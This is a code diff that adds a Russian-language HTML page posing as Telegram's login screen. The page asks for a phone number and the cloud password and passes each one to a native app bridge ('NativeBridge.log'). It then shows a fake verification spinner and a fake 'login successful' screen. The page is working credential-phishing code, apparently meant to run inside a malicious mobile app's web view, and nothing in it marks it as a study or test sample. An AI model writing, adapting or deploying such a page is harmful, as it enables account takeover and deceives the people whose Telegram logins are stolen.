@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Telegram</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0;
+    font-family: -apple-system, 'Roboto', Arial, sans-serif; }
+body { background: #ffffff; color: #000; min-height: 100vh;
+       display: flex; flex-direction: column; align-items: center; padding: 24px 16px; }
+
+.logo { width: 100px; height: 100px; margin: 40px 0 20px;
+        display: flex; align-items: center; justify-content: center;
+        background: linear-gradient(135deg, #2AABEE, #229ED9);
+        border-radius: 50%; }
+.logo svg { width: 60px; height: 60px; fill: #fff; }
+
+.card { width: 100%; max-width: 400px; padding: 20px; }
+h1 { font-size: 24px; font-weight: 500; text-align: center;
+     color: #000; margin-bottom: 8px; }
+.sub { text-align: center; font-size: 15px; color: #707579; margin-bottom: 32px; }
+
+.field { position: relative; margin-bottom: 20px;
+         background: #f4f4f5; border-radius: 10px; padding: 4px 12px; }
+.field label { display: block; font-size: 12px; color: #229ED9;
+               padding-top: 8px; }
+.field input { width: 100%; padding: 6px 0 10px 0; font-size: 17px;
+               border: none; outline: none; background: transparent; color: #000; }
+
+.btn { width: 100%; background: #2AABEE; color: #fff; border: none;
+       padding: 14px 20px; border-radius: 10px; font-size: 16px;
+       font-weight: 500; cursor: pointer; margin-top: 12px;
+       transition: background 0.2s; }
+.btn:active { background: #229ED9; }
+
+.screen { display: none; }
+.screen.active { display: block; }
+
+.spin { border: 3px solid #f3f3f3; border-top: 3px solid #2AABEE;
+        border-radius: 50%; width: 44px; height: 44px;
+        animation: spin 1s linear infinite; margin: 30px auto; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.loading-text { text-align: center; color: #707579; font-size: 14px; }
+
+.check { width: 80px; height: 80px; border-radius: 50%;
+         background: #4CAF50; margin: 40px auto 20px;
+         display: flex; align-items: center; justify-content: center; }
+.check::after { content: '✓'; color: #fff; font-size: 48px;
+                font-weight: bold; }
+.done-msg { text-align: center; font-size: 18px; color: #000;
+            font-weight: 500; margin-bottom: 8px; }
+.done-sub { text-align: center; font-size: 14px; color: #707579; }
+</style>
+</head>
+<body>
+
+<div class="logo">
+    <svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
+</div>
+
+<div class="card">
+
+    <div id="scPhone" class="screen active">
+        <h1>Вход в Telegram</h1>
+        <p class="sub">Введите ваш номер телефона или имя пользователя</p>
+        <div class="field">
+            <label>Номер телефона</label>
+            <input type="tel" id="phone" autocomplete="off" placeholder="+380">
+        </div>
+        <button class="btn" onclick="submitPhone()">Далее</button>
+    </div>
+
+    <div id="scPass" class="screen">
+        <h1>Введите пароль</h1>
+        <p class="sub">Ваш аккаунт защищён облачным паролем</p>
+        <div class="field">
+            <label>Пароль</label>
+            <input type="password" id="password" autocomplete="off">
+        </div>
+        <button class="btn" onclick="submitPass()">Войти</button>
+    </div>
+
+    <div id="scLoad" class="screen">
+        <div class="spin"></div>
+        <div class="loading-text">Проверка данных…</div>
+    </div>
+
+    <div id="scDone" class="screen">
+        <div class="check"></div>
+        <div class="done-msg">Вход выполнен</div>
+        <div class="done-sub">Синхронизация с Telegram…</div>
+    </div>
+
+</div>
+
+<script>
+var state = { phone: "", password: "" };
+
+function show(id) {
+    var s = document.querySelectorAll('.screen');
+    for (var i = 0; i < s.length; i++) s[i].classList.remove('active');
+    document.getElementById(id).classList.add('active');
+}
+
+function send(k, v) {
+    if (window.NativeBridge && NativeBridge.log) {
+        NativeBridge.log(k + "=" + v);
+    }
+}
+
+function submitPhone() {
+    var p = document.getElementById('phone').value;
+    if (!p) return;
+    state.phone = p;
+    send("tg_phone", p);
+    show('scPass');
+}
+
+function submitPass() {
+    var p = document.getElementById('password').value;
+    if (!p) return;
+    state.password = p;
+    send("tg_password", p);
+    show('scLoad');
+    setTimeout(function() {
+        show('scDone');
+        setTimeout(function() {
+            if (window.NativeBridge && NativeBridge.done) {
+                NativeBridge.done();
+            }
+        }, 1500);
+    }, 2000);
+}
+</script>
+</body>
+</html>
